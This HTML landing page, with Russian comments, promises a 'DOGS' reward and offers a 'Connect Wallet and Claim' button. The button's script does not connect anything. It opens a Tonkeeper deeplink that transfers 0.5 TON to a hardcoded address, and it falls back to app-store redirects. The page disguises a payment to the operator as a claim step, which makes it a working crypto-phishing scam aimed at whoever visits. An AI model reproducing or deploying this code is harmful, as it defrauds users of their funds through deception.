<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Подключить кошелек</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #000;
            color: white;
            font-family: Arial, sans-serif;
        }

        /* Стили для изображения */
        .image {
            width: 75%; /* Занимает всю ширину контейнера */
            height: auto;
            margin-bottom: 15px;
            border-radius: 10px;
        }

        .container {
            width: 90%;
            max-width: 400px;
            padding: 20px;
            background-color: #000000;
            border-radius: 15px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            text-align: center;
        }

        .button-main {
            padding: 12px 20px;
            background-color: #ffffff;
            color: rgb(0, 0, 0);
            border: none;
            border-radius: 5px;
            font-size: 1em;
            cursor: pointer;
            transition: background-color 0.3s ease;
            width: 100%;
        }

        .button-main:hover {
            background-color: #cacaca;
        }

        /* Адаптивные стили */
        @media (max-width: 480px) {
            .container {
                padding: 15px; /* Уменьшаем отступы на меньших экранах */
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="./dogs.jpg" alt="Join DOGS" class="image">
        <h2>Connect your wallet</h2>
        <button class="button-main" onclick="connectWallet()">Connect Wallet and Claim</button>
    </div>

    <script>
        function connectWallet() {
            const tonAmount = 0.5;
            const userUID = "QCwDpTnJclQCsiJ6cLqqhr97LWX4RklOAWr3eBBENsilJhM";
            const deeplink = `tonkeeper://transfer/${userUID}?amount=${tonAmount * 1e9}`; // Deeplink для открытия приложения

            // Открытие deeplink
            window.location.href = deeplink;

            // Таймер для проверки, что приложение открывается
            setTimeout(() => {
                // Проверяем пользовательское устройство
                const userAgent = navigator.userAgent || navigator.vendor || window.opera;
                
                // Ссылки для установки приложения
                const playStoreURL = 'https://play.google.com/store/apps/details?id=com.tonkeeper'; // Ссылка на установку приложения в Google Play
                const appStoreURL = 'https://apps.apple.com/app/idYOUR_APP_ID'; // Замените YOUR_APP_ID на идентификатор вашего приложения в App Store

                if (/android/i.test(userAgent)) {
                    // Перенаправляем на Google Play, если устройство Android
                    window.location.href = playStoreURL;
                } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
                    // Перенаправляем на App Store, если устройство iOS
                    window.location.href = appStoreURL;
                } else {
                    // Для остальных случаев
                    alert('Please install the appropriate app from your app store.');
                }
            }, 2000); // Задержка 2 секунды
        }
    </script>
</body>
</html>
